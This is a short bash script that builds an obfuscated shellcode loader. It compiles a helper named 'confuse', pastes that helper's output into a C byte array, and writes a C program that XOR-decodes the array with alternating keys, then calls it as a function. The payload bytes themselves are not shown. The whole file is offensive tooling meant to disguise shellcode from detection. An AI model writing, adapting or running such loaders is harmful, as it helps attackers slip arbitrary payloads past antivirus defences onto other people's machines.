#!/bin/bash

gcc confuse.c -o confuse

cat << EOF > ./shellcode.c
#include <stdio.h>
#include <stdlib.h>

unsigned char buf[] = 
$(./confuse)

int main()
{
    int i;
    void (*func)(void);
    char *p;
    p = (char *)malloc(sizeof(buf));

    for(i = 0; i < (sizeof(buf) - 1); i++) {
        if (i % 2 == 0) {
            p[i] = buf[i] ^ 0xaa;
        } else {
            p[i] = buf[i] ^ 0x55;
        }
    }

    p[i] = '\0';
    func = (void (*)())p;
    func();
    return 0;
}
EOF
